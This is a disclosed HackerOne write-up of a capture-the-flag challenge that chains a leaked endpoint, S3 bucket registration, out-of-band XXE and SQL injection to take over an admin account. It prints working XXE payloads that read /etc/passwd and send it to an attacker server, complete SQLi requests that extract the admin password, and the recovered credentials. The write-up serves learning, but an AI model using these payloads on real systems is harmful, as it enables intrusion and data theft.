---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
  - impact/account-takeover
  - trigger/admin-required
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2021-06-17
submitted: 2021-06-03T13:51:39.449Z
bounty_usd: null
votes: 25
cve: []
program: "[[programs/h1-ctf|h1-ctf]]"
reporter: "w31rd0"
source: "https://hackerone.com/reports/1216408"
title: "H1-CTF 100k Solution - Congratz on the 100k Rep todayisnew"
---
# H1-CTF 100k Solution - Congratz on the 100k Rep todayisnew

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 25 | **Program:** h1-ctf | **Disclosed:** 2021-06-17

- Report: [https://hackerone.com/reports/1216408](https://hackerone.com/reports/1216408)
- CWE: SQL Injection
- Submitted: 2021-06-03T13:51:39.449Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Sharing the final flag for now. Writeup will come soon 
`██████`

██████████

## Impact

Takeover of admin account :)

## Timeline

- **Report Filed**
- **2021-06-03** @w31rd0: Hey all and once again congratulation to @todayisnew for reaching 100k Rep
So as any other CTF we start by the [h1-ctf](https://hackerone.com/h1-ctf) page and grab the target 

1) We visit [h1-ccc](https://ccc.h1ctf.com) and we notice that a Twitter profile in linked within the page 
Twitter Profile can be found here [DesignsCcc](https://twitter.com/DesignsCcc)
2) We visit the twitter profile and we go through the post. We notice a [screenshot](https://twitter.com/DesignsCcc/status/1398629597298806786/photo/1) of the person's computer and we notice that we can see one interesting tab in his browser.
This gives us a hard to guess endpoint on the web application.
Browser URL:
`https://ccc.h1ctf.com/error_-_-_log.txt`

{F1325077}
3) When we visit the URL we notice a list of URLs, that use some subdomains on AWS.
Example of content:
`File: https://h1-wfzfi4.s3.eu-west-2.amazonaws.com/files.xml Not Found`
For now this does not provide a lot of insight (although we can takeover the domains - seems this time Eric missed some STOs ). Since there are no pugs we return to the web application

{F1325089}
4) When registering for a new user we notice that we are redirected to our profile and a link like the following is created
https://ccc.h1ctf.com/u/6pdxy7
We also notice in the profile page that the following message is returned

`Critical : Remote File list not found`

By this we understand that our profile is trying to load some sort of file. But not sure from where. After playing around with no success, we return to the file containing the subdomains we initially found.
From a closer look it seems that the subdomains follow some pattern like
h1-XXXXXX.eu-west-2.amazonaws.com/files.xml

Where the XXXXXX follows the pattern of our user identification value that we can see after registration.

5) We attempt to create a subdomain on AWS following that pattern. For example for the id above we register a bucket like h1-6pdxy7.
We also noticed that the files.xml file in mentioned which hints towards XXE attack (due to the .xml extension)

6) After a lot of trial and error we manage to get a working XXE OOB attack.
We host the following content in a file on a server we control and name it like `exploit.dtd`
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://IP:8082/?x=%file;'>">
%eval;
%exfil;
````

Then we create a file with the following content and upload it on our AWS bucket and name it files.xml
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://IP:8082/exploit.dtd"> %xxe;]>
<foo>&xxe;</foo>
```

The above payloads will extract the `/etc/passwd` file and send it as base64 encoded to our server as part of the `x` parameter.

After extracting a lot of files we end up with an interesting one hosted under `/etc/nginx/sites-enabled/default`
We can see the file content returned below 

{F1325110}

7) Once decoded from base64 we go over the file contents we notice the following lines
```
#    }
#     location /2b5d2b11513d2c9b {
#       proxy_pass http://127.0.0.1:8888;
#     }
```

8) We now have a new application to explore. Hosted under 
[Pinger app](https://ccc.h1ctf.com//2b5d2b11513d2c9b)

we perform a directory enumeration and we get a git repository exposed
[Git config](https://ccc.h1ctf.com/2b5d2b11513d2c9b/.git/config)

With the following content

```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/ccc-labs/pinger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```
9) We visit the github repo by following the link below
` https://github.com/ccc-labs/pinger.git`
After looking around we notice a few interesting stuff

A) An API endpoint as `/api/ping?id=`

{F1325116}
B) An SQL query that seems vulnerable to SQL injection

{F1325117}

and some protection mechanisms such as
https://github.com/ccc-labs/pinger/blob/main/_pingercode_/waf.php
and
https://github.com/ccc-labs/pinger/blob/8fce47791b92f183c0f1a7e033c87bab4881737d/_pingercode_/controllers/Pinger.php

The first file blocks certain key words like SLEEP and BENCHMARK meaning we can not perform time based SQLInjection.
The second will limit our attack to one request per minute

A lot of pain seems to be coming our way. (THANKS ADAM :P )

10) We initially try to confirm that we can achieve SQL injection
The following request uses a UNION based SQLi and selects an invalid ID and then appends the IP we control. If this evaluates successfully since our IP is the only one there (and the ID parameter did not return any output). We will get 4 ping requests.

```http
GET /2b5d2b11513d2c9b/api/ping?id=5+UNION+SELECT+4,"IP",32--+ HTTP/1.1
Host: ccc.h1ctf.com
X-Real-IP: test1
Cookie: █████████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close
Content-Length: 2
```

We also notice that we can affect the packet_size
```php
shell_exec('ping -s '.$packet_size.' -c 4 '.$ip.'  > /dev/null &');
```

This looks further interesting since we can control how many bytes we can send.
But the problem is that it only accepts Integer values.
What we can do here is to extract 1 character at the time  convert it to an integer and pass it to the packet_size.
We end up with a payload as the following in order to extract what matters in such cases (yeah you guess right, the admin password)

```http
GET /2b5d2b11513d2c9b/api/ping?id=5+UNION+SELECT+1,"IP",(ASCII(SUBSTR((SELECT+password+FROM+user+WHERE+username='admin'),+1,+1)))--+ HTTP/1.1
Host: ccc.h1ctf.com
X-Real-IP: test1
Cookie: █████████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close
Content-Length: 2
```

After 20+ minutes since the password is of 20 characters long we obtain the following values as the length of the received ping request
`93 108 63 65 102 57 80 80 82 44 95 50 81 87 106 105 83 108 89 111 81`

we can see below the ping requests and the data length received on our server for each of the first four characters of the admin password

{F1325153}

11) We can keep extracting the characters one by one up to 20 characters  via the following payload
`5+UNION+SELECT+1,"IP",(ASCII(SUBSTR((SELECT+password+FROM+user+WHERE+username='admin'),+20,+1)))`

Once we have all numeric values we need to remove 8 bytes to get the actual ASCII values, which gives back the following
`085 100 055 057 094 049 072 072 074 036 087 042 073 079 098 097 075 100 081 103 073`

Once decoded we retrieve the final pass
`Ud79^1HHJ$W*IObaKdQgI`

12) we can now login to [Pinger](https://ccc.h1ctf.com/2b5d2b11513d2c9b/) with the credentials bellow and retrieve the final flag
`admin:Ud79^1HHJ$W*IObaKdQgI`

█████████
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Report Became Public**
